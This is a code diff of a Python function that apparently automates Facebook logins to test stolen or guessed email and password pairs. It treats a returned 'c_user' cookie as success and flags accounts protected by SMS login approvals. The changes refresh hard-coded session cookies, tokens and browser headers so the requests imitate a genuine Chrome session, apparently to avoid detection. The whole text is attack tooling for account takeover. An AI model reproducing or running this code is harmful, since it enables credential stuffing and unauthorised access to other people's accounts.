@@ -1442,8 +1442,8 @@ def x(uid,pwx,tl):
             'trynum': '1',
             'timezone': '-330',
             'lgndim': 'eyJ3IjoxNDQwLCJoIjo5MDAsImF3IjoxNDQwLCJhaCI6ODYwLCJjIjoyNH0=',
-            'lgnrnd': '052059_zzYq',
-            'lgnjs': '1736601662',
+            'lgnrnd': '033731_4MaO',
+            'lgnjs': '1737373024',
             'email': uid,
             'prefill_contact_point': '',
             'prefill_source': 'browser_dropdown',
@@ -1452,38 +1452,38 @@ def x(uid,pwx,tl):
             'first_prefill_type': 'password',
             'had_cp_prefilled': 'false',
             'had_password_prefilled': 'true',
-            'ab_test_data': '/AAAAAAAAAAAAAAAAAAAA/AAAAAAAAAAAAAAAAAAAAA/MyAZMABFAD',
+            'ab_test_data': 'AAAAAAAAAAAAAAAAAAAA//AAAAAAAAAAAAAAAAAAAAJbSJ/AAABGAB',
             'encpass': "#PWD_BROWSER:0:{}:{}".format(str(time.time()).split('.')[0], pw),}
             cookies = {
-            'ps_n': '1',
-            'ps_l': '1',
-            'sb': 'vv1mZoqkaQr8BYILQ8WaAKOT',
-            'datr': 'PJp1ZglQIotPNJW3IGpT68nu',
-            'sfau': 'AYjMNhYbhJJKHub9INn2LVIOk_KlDFrYcjDHkwi-qhkmT6hd96D9YcyodOX8Q3nTrirsGwEz6e8ttQN7VKDQWA-6SJP-T9l3xNSJgw4cJ-83joJqUEF0lNk0ynoW0egGqbdW6dX2TjUNFz61aeN7etUH63w-vcfVv30d-zIkJaGRXaZLoEEd6IjCn4pYcx_IhsvXA8HZiUq2efqkXK-r2SbHZVBWrzjQHWeRFi8QjQaAJNrkbkEKy4LSMN009rK9n4t2LzH9OKyV48eeErPFLquH',
-            'locale': 'hi_IN',
-            'fr': '1rNHx4L9yZvgxejws.AWUw_dldva5b5OSWcYlAYTKfJ-E.BnXFu6..AAA.0.0.BngnA7.AWUeR4pMo1E',
-            'sfiu': 'AYhdSgzV6FLYADk3WVsiXrwI291m6e0dQc8F7n4dFja5OQjCHO8Tc2sADMDmo1ap-fl3xoLhOv5Xcg-p9GQMv0fFzMfNIOyHjAsp8mpCpHN60FkFtrJbkhZfnayuRJ_bz9u2_iKZgfKd7k9WWt4z1L-vwxDzlc26G37IXrjskiLnr5c9RoX1ypWcmCRx_ujQWj3Mn8494e2Xemzmu_NNKcdjwaeQxvBRuslmgSEG6XrCNqs4CM3qDKJWwdUEBM2yS3gM2VCY0iedtQW06TNCDLkJ',
-            'wd': '1440x788',}
+            'datr': 'SXuLZ9N9DYxth3k4nM4F3v35',
+            'sb': 'SXuLZ1f7vIXL4JEKB93_kwPj',
+            'fr': '0E7Na19QYsryWECvb.AWUeoJg9Jm0WlFfmNdnDCy-trqI.Bni3tK..AAA.0.0.BnjjV7.AWWeOzMYGyA',
+            'wd': '427x745',}
             headers = {
             'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
-            'accept-language': 'en-US,en;q=0.9',
-            'cache-control': 'no-cache',
+            'accept-language': 'en-IN,en-US;q=0.9,en-GB;q=0.8,en;q=0.7,hi;q=0.6,gu;q=0.5,bn;q=0.4',
+            'cache-control': 'max-age=0',
             'content-type': 'application/x-www-form-urlencoded',
-            'origin': 'https://hi-in.facebook.com',
-            'pragma': 'no-cache',
+            'dpr': '1',
+            'origin': 'https://www.facebook.com',
             'priority': 'u=0, i',
-            'referer': 'https://hi-in.facebook.com/login/?privacy_mutation_token=eyJ0eXBlIjowLCJjcmVhdGlvbl90aW1lIjoxNzM2NjAwMDEyLCJjYWxsc2l0ZV9pZCI6MzgxMjI5MDc5NTc1OTQ2fQ%3D%3D&next',
-            'sec-ch-ua': '"Microsoft Edge";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
+            'referer': 'https://www.facebook.com/login/',
+            'sec-ch-prefers-color-scheme': 'dark',
+            'sec-ch-ua': '"Google Chrome";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
+            'sec-ch-ua-full-version-list': '"Google Chrome";v="131.0.6778.265", "Chromium";v="131.0.6778.265", "Not_A Brand";v="24.0.0.0"',
             'sec-ch-ua-mobile': '?0',
+            'sec-ch-ua-model': '""',
             'sec-ch-ua-platform': '"Windows"',
+            'sec-ch-ua-platform-version': '"10.0.0"',
             'sec-fetch-dest': 'document',
             'sec-fetch-mode': 'navigate',
             'sec-fetch-site': 'same-origin',
             'sec-fetch-user': '?1',
             'upgrade-insecure-requests': '1',
-            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36 Edg/131.0.0.0',}
+            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36',
+            'viewport-width': '427',}
             twf = "Login approval"+"s are on. "+"Expect an SMS"+" shortly with "+"a code to use"+" for log in"
-            url = 'https://hi-in.facebook.com/login/device-based/regular/login/?login_attempt=1&lwv=100'
+            url = 'https://www.facebook.com/login/device-based/regular/login/?login_attempt=1&lwv=100'
             po = Session.post(url, data=data, cookies=cookies, headers=headers, allow_redirects=False).text
             response = Session.cookies.get_dict().keys()
             if "c_user" in response:
